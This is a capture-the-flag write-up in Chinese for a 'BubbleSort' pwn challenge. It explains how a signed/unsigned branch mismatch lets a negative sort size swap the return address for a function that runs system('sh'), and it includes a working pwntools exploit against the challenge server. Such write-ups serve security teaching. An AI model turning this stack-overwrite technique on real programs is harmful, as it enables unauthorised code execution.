## BubbleSort
程式先要求array長度，接著讀取每個元素內容，再讀取一個要sort的大小，接著進行sort，而隨意測試發現array長度不可輸入負數(branch使用`JBE`)，範圍為(0 ~ 127)，但排序長度可以(branch使用`JLE`)。因此sort可以排序到0~255(-1)的size，意即我們可以令input在經過sort後swap掉return address。

從ELF symbol中可以發現`DarkSoul`這個function，反組譯後發現內部會執行`system('sh')`因此將return address swap為`DarkSoul`的位址即可。

觀察stack上的內容在int array到return之間的值都> 0x80000000，因為是以int比較，因此這些值會作為負數，當送的payload中全部填0，則這些值會被swap到最前面，而DarkSoul的位址0x08048580放在陣列的最後面，因此只要輸入(return address - buffer)/sizeof(int)就能讓DarkSoul swap到目標，而這個值為-125(131)，

```python
#!/usr/bin/env python3
from pwn import *
context(arch='amd64')

p = remote('csie.ctf.tw', 10121)
b = ELF('bubblesort')

array = [0] * 126 + [b.symbols[b'DarkSoul']]
p.sendline('127') # 127 elements
for num in array:
    p.sendline(str(num))
p.sendline('-125') # 131
p.interactive()
```
